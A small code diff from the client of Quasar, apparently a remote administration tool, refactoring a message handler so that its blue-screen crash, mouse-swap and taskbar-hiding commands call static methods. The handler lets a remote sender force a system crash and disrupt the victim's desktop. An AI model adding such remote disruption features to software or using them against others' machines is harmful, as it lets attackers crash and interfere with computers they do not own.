@@ -9,10 +9,6 @@ namespace Quasar.Client.Messages
 
     public class FunStuffHandler : IMessageProcessor
     {
-        private BSOD _bsod = new BSOD();
-        private SwapMouseButtons _swapMouseButtons = new SwapMouseButtons();
-        private HideTaskbar _hideTaskbar = new HideTaskbar();
-
         public bool CanExecute(IMessage message) => message is DoBSOD || message is DoSwapMouseButtons || message is DoHideTaskbar;
 
         public bool CanExecuteFrom(ISender sender) => true;
@@ -37,7 +33,7 @@ namespace Quasar.Client.Messages
         {
             client.Send(new SetStatus { Message = "Successfull BSOD" });
 
-            _bsod.DOBSOD();
+            BSOD.DOBSOD();
         }
 
         private void Execute(ISender client, DoSwapMouseButtons message)
